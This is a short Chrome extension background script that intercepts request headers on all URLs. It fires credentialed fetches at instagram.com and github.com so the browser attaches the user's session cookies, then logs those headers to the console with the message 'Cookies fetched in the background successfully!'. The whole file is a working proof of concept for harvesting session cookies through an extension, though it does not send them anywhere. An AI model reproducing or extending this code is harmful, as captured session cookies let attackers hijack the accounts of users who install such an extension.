var handleLists = function (infos) {
    var detailsHeader = infos.requestHeaders;
    //console.log(infos);

    if (infos.url.match(/(instagram\.com|github\.com)/gi)) {
    	for (item of detailsHeader) {
 	   		console.log(`[${item.name}: ${item.value}]`)
 		}
 		console.log("%c Cookies fetched in the background successfully!", "color: red; font-size:28px;");
	}

    return {
        requestHeaders: detailsHeader
    }
};

chrome.webRequest.onBeforeSendHeaders.addListener(handleLists, {
    urls: ["<all_urls>"]
}, ['requestHeaders', 'blocking', 'extraHeaders']);

fetch('https://www.instagram.com/?testcree', {credentials: 'include'});
fetch('https://github.com/?testcree', {credentials: 'include'});